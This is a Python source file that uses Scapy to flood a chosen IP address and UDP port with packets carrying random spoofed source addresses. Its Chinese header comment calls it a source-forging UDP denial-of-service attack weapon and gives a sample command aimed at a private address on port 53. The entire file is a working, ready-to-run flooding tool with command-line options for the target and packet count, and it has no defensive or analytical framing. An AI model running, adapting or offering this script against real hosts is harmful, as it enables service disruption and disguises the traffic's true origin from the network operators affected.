# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *

from scapy.layers.inet import IP, UDP

"""
伪造src的UDP拒绝服务攻击，传输层拒绝服务攻击， 无回显。压力需要够大。

python UDP拒绝服务攻击武器.py --ip 10.0.4.148 --port 53 --count 10
"""

ret = dict()
ret['status'] = None


def start_attack(dst, port, count):
    for i in range(count):
        send(IP(src=RandIP(), dst=dst) / UDP(dport=port),verbose=False)

    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --ip 1.1.1.1 --port 53 --count 200 \n')
    parser.add_option('-i', '--ip', dest='attack_ip', default='1.1.1.1', type='string', help='attack ip')
    parser.add_option('-p', '--port', dest='attack_port', default='53', type='string', help='attack port')
    parser.add_option('-c', '--count', dest='attack_count', default='100', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(options.attack_ip, int(options.attack_port), int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
